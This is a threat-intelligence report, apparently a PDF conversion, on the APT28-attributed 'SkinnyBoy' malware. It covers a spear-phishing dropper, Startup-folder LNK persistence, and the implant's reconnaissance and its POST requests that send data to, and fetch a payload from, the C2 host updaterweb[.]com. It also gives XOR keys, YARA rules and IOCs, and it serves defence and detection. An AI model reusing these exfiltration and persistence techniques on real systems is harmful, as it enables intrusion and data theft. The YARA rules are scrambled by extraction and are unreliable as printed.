05 2021 TLP: WHITEA NOT SO FANCY GAME EXPLORING THE NEW SKINNYBOY BEAR’S BACKDOOR2021 - Cyber Threat Intelligence Researchwww.cluster25.io 02 ADVERSARY OPERATIONAL SECURITY INFECTION CHAIN 01 VECTOR AND FIRST STAGE 02 SKINNYBOY DROPPER 03 SKINNYBOY LAUNCHER 04 SKINNYBOY IMPLANT ATTRIBUTION ATT&CK MATRIX DETECTION RULE SKINNYBOY DROPPER [YARA] SKINNYBOY LAUNCHER [YARA] SKINNYBOY IMPLANT [YARA] IOCS ABOUT THE REPORT3 232| 2021 Cyber Threat Intelligence Research© Cluster25EXECUTIVE SUMMARYThis paper presents an analysis of a new and previously unreported malware internally dubbed as "SkinnyBoy".Based on long-term observations and technical evidence, Cluster25 cyber intelligence research team associates this implant, with a medium-high degree of confidence, to the threat actor known as APT 28 / Fancy Bear / Pawn Storm.3| 2021 Cyber Threat Intelligence Research© Cluster25INTRODUCTION01 INTRODUCTIONAPT 28 (aka Pawn Storm, Fancy Bear, Strontium) is a famous hacking group that often grabs the media's attention when suspected of perpetrating cyber intrusions that occurred against high profile public and private institutions.It's categorized as APT (Advanced Persistent Threat) because this adversary pursues a well- defined set of goals against a set of well-defined targets. Presumably operating since the mid-2000s, its techniques, tactics, and procedures are compatible with a state-sponsored threat actor. The group usually targets companies and organizations operating in the military, government, and diplomatic sectors, and security organizations aligned with the NATO objectives.This adversary can adopt different techniques and tactics to obtain initial access to the victim's system. Among these there are certainly:1. Watering hole attacks against compromised websites frequently visited by targets 2. Exploit kit / 0day and common vulnerabilities used to infect targets 3. Social engineering techniques, such as spear-phishing email messages 4. Credential TheftHowever, even though these techniques can sometimes be very evolved, it is not unusual to observe and correlate less sophisticated activities aimed at obtaining a foothold in the targeted perimeter.Indeed, APT28 / Fancy Bear has been observed quite often updating their tools and malware implants. While over time it was possible to notice substantial increases in sophistication even among different samples of the same malware family, other times the level of sophistication was significantly lower than expected.4| 2021 Cyber Threat Intelligence Research© Cluster25INTRODUCTIONConsidering the group's capabilities, the tactic of significantly lowering these levels becomes functional with an attempt to deceive the APT nature of the sample and make any attribution effort more complex.This is the case of the last implant observed by our research team which has a rather low level of sophistication and basic operating logic even if fully operational and functional. This implant, which is still unreported at the time of writing, has been internally called SkinnyBoy and its attribution goes to APT28/Fancy Bear group after months of observations.Before analyzing this sample, we found out it was uploaded on a popular online platform and detected only by Microsft Defender engine as belonging to the "AceLog" family.During our analysis, we came to the conclusion that this implant was used to target military and government institutions.5| 2021 Cyber Threat Intelligence Research© Cluster25INTRODUCTION02 ADVERSARY OPERATIONAL SECURITYDuring the analysis of the campaign, the adversary was observed using commercial VPN services as part of their OPsec in order to hide thier tracks. The same VPN services were used to purchase and manage their infrastructure during this campaign, according to the simplified scheme shown below:Fig. 1 - Adversary connectivity schema6| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAINComparable with previous APT28 / Fancy Bear attacks, the actor used spear-phishing techniques to deliver multi-staged infection chains with at least two different drop points.7| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAIN01 VECTOR AND FIRST STAGEThe vector of the infection is a spear phishing email delivering a Word Office document with a significant name related to an International Conference. Both the vector and its naming are consistent with APT28 / FancyBear TTPs. As expected, the document triggers a MACRO function able to extract a Microsoft Dynamic Link Library (DLL) which then acts as downloader of a SkinnyBoy dropper (tdp1.exe) from a first dropurl.02 SKINNYBOY DROPPERtpd1.exe is the second stage of the infection. Once downloaded in the victim's file system, it extracts all the components necessary to set persistence and trigger the following malicious operations. The extracted payload is encoded in Base64 format and appended as an overlay in the executable file.Fig. 2 - Overlay of tpd1.exe8| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAINAt the time of execution, the malicious process decodes the payload and, starting from it, writes two different files on the filesystem, then deletes itself. The dropped files are:-C:\Users\%username%\AppData\Local\devtmrn.exe encrypted way. The actor used a different XOR key for each string used. Some of these associations are shown in the following table.CLEAR STRINGUSED XOR KEYMicrosoft TerminalServerClient TermSrvClt.dllMV$)fjgkl KV*#4u8K#HdefnNFn4fg IOJ$C#83r#rji2Tab. 1 - Used XOR keysTo stay under the radar, the malware never executes the extracted files. Instead, it creates a persistence mechanism on the infected machine which allows a delayed execution of the next stages.It creates a LNK file under Windows Startup folder (%appdata%\Microsoft\Windows\Start Menu\Programs\Startup), named devtmrn.lnk, which points to the extracted malware devtmrn.exe.The creation of the link file occurs through a Windows COM object instantiated using the CoCreateInstance WinAPI function, passing the CLSID associated to LNK files as argument.9| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAINFig. 3 - Part of the routine used to create LNK file(HKEY_CLASSES_ROOT\.lnk\ShellEx\{000214F9-0000-0000-C000-000000000046})03 SKINNYBOY LAUNCHEROnce the machine reboots, the LNK file, placed into system's Startup folder, triggers the execution of the devtmrn.exe executable, which simply acts as a launcher of the main implant.When launched, it only checks the existence of the following pathC:\Users\%username%\AppData\Local\Microsoft\TerminalServerClient\TermSrvClt.dlland starts a new process invoking the first DLL exported function, named RunMod.10| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAINTo identify the right DLL to launch, the executable calculates the SHA256 hashes of each filename into C:\Users\%username%\AppData\Local comparing each one of them with the pre-computed SHA256 of the string TermSrvClt.dll, which is:F4 EB 56 52 AF 4B 48 EE 08 FF 9D 44 89 4B D5 66 24 61 2A 15 1D 58 14 F9 6D 97 13 2C 6D 07 6F 86Hashes are calculated through classic WinAPI functions, such as CryptHashData and CryptGetHashParam, as illustrated in the following figure.Fig. 4 - Hash checking routine11| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAIN04 SKINNYBOY IMPLANTThe DLL executable, named TermSrvClt.dll, corresponds to the main implant of the infection chain. It exfiltrates information about the infected system and retrieves and launches the final payload.Once triggered, the process executes two Windows utilities to gather information about the system, systeminfo.exe and tasklist.exe. subsequently, it extracts a list of filenames contained in a subset of interesting directories, which are:- C:\Users\%username%\Desktop - C:\Program Files - C:\Program Files (x86) - C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Administrative Tools - C:\Users\%username%\AppData\Roaming - C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Templates - C:\Windows - C:\Users\user\AppData\Local\TempThe output of this phase is concatenated using a fixed structure, which is then sent to the Command and Control, updaterweb[.]com, using a POST request with the following body schema:12| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAINPOST url HTTP/1.1 User-Agent: Opera Host: updaterweb.com Content-Length: 39739 Cache-Control: no-cacheid={MACHINE_NAME}#{USERNAME}#{DISK_VOLUME_SERIAL} &current=1&total=1&data={BASE64_ENCODED_EXTRACTED_INFO}Tab. 2 - First POST requestBefore being encoded in Base64, the previously extracted information is organized according to the following structure:13| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAIND8 1A 00 00 systeminfo output {two random bytes} 00 00 tasklist output {two random bytes} 00 00 ##################C:\Users\user\Desktop\*################## files list ##################C:\Program Files\*################## files list ##################C:\Program Files (x86)\*################## files list ##################C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Administrative Tools\*################## files list ##################C:\Users\user\AppData\Roaming\*################## \Users\user\AppData\Roaming\Microsoft\Windows\Templates\*################## ##################C:\Users\user\AppData\Local\Temp\*################## files listTab. 3 - POST body structure14| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAINAfter completing the first HTTPS POST request containing the gathered information, the malware contacts the C2 again in order to retrieve the next payload. The new POST request is structured as follow:POST url HTTP/1.1 User-Agent: Opera Host: updaterweb.com Content-Length: 37 Cache-Control: no-cacheid={MACHINE_NAME}#{USERNAME}#{DISK_VOLUME_SERIAL}&cmd=yTab. 4 - Second POST requestTo avoid static detection, the format strings used to build the POST request body are XORED using two different keys, as seen in the previous stage.CLEAR STRINGUSED XOR KEYid=%s#%s#%u&current=%s&total=%s&data=id=%s#%s#%u&cmd=yqpzoamxiendufbtbf3- #$*40fvnpwOPDwdkvn CEJ&V%$84k839y92mTab. 5 - Other XOR keys15| 2021 Cyber Threat Intelligence Research© Cluster25INFECTION CHAINFinally, the Command and Control should reply with the next DLL that will be executed, representing the final stage of the infection, which probably manifests backdoor behaviors.By statically analyzing the TermSrvClt.dll compiled code, we can assume that once the server correctly replies, it stores the downloaded file in %TEMP% folder, self-injecting and executing it in memory using the LoadLibrary and GetProcAddress WinAPIs. The downloaded file is then deleted to covert the infection tracks.Fig. 5 - Part of DLL loading16| 2021 Cyber Threat Intelligence Research© Cluster25ATTRIBUTIONAfter a period of observation of the described threat and an in-depth analysis of the identified victimology, Cluster25 team attributes the SkinnyBoy implant and the related attack to Russian Group known as APT28 / FancyBear with a mid- to-high confidence.17| 2021 Cyber Threat Intelligence Research© Cluster25ATT&CK MATRIXTACTICTECHNIQUENAMEExecutionPersistenceT1059T1204T1547Command and Scripting InterpreterUser ExecutionBoot or Logon Initialization ScriptsDefense EvasionT1140Deobfuscate/Decode Files or InformationDiscoveryCollectionCommand and ControlExfiltrationT1057T1082T1083T1005T1119T1071T1132T1020T1041Process DiscoverySystem Information DiscoveryFile and Directory DiscoveryData From Local SystemAutomated CollectionApplication Layer ProtocolData EncodingAutomated ExfiltrationExfiltration over C2 Channel18| 2021 Cyber Threat Intelligence Research© Cluster25DETECTION RULESkinnyBoy Dropper [YARA]rule APT28_SkinnyBoy_Dropper: RUSSIAN THREAT ACTOR { (uint16(0) == 0x5A4D and all of them) condition:author = "Cluster25" $ = "cmd /c DEL " ascii $ = " \"" ascii $ = {8a 08 40 84 c9 75 f9} $ = {0f b7 84 0d fc fe ff ff 66 31 84 0d fc fd ff ff}19| 2021 Cyber Threat Intelligence Research© Cluster25DETECTION RULESkinnyBoy Launcher [YARA]meta: strings:rule APT28_SkinnyBoy_Launcher: RUSSIAN THREAT ACTOR { 13 2C 6D 07 6F 86} 56 ?? ?? ?? ?? 50 FF ?? ?? ?? FF 15 ?? ?? ?? ?? FF 15 ?? ?? ?? ??} }condition:author = "Cluster25" $l2 = "CryptCreateHash" ascii $l3 = "FindNextFile" ascii $l4 = "PathAddBackslashW" ascii $l5 = "PathRemoveFileSpecW" ascii $h1 = {50 6A 00 6A 00 68 0C 80 00 00 FF ?? ?? ?? FF 15 ?? ?? ?? ?? FF 15 ?? ?? ?? ?? 6A 00$h2 = {8B 01 3B 02 75 10 83 C1 04 83 C2 04 83 EE 04 73 EF}uint16(0) == 0x5a4d and filesize < 100KB and ($sha or (all of ($l*) and all of ($h*)))20| 2021 Cyber Threat Intelligence Research© Cluster25DETECTION RULESkinnyBoy Implant [YARA]meta: strings:import "pe" rule APT28_SkinnyBoy_Implanter: RUSSIAN THREAT ACTOR { 85 [4] 6A ?? 50 66 [7] E8} }condition:author= "Cluster25" date= "2021-05-24" contained are not subject to restrictions on sharing in its original form.23| 2021 Cyber Threat Intelligence Research© Cluster25Cluster25 is a cybersecurity research division. Its experts are specialized in hunting and collecting cyber threats, analysis and reverse-engineering processes. Cluster25’s members internally develop technologies and capabilities for attribution practices, classification and categorization of malicious artifacts, often before being used in operations.Visit us at cluster25.io©2021 Cluster25. All rights reserved. All materials are intended for the original recipient only. The reproduction and distribution of this material is prohibited without express written permission from Cluster25. Given the inherent nature of threat intelligence, the content contained in this report is based on information gathered and understood at the time of its creation. The information in this report is general in nature and does not take into account the specific needs of your IT ecosystem and network, which may vary and require unique action. As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the information contained or referenced in this report. The reader is responsible for determining whether or not to follow any of the suggestions, recommendations or potential mitigations set out in this report, entirely at their own discretion2021 - Cyber Threat Intelligence Research© Cluster25 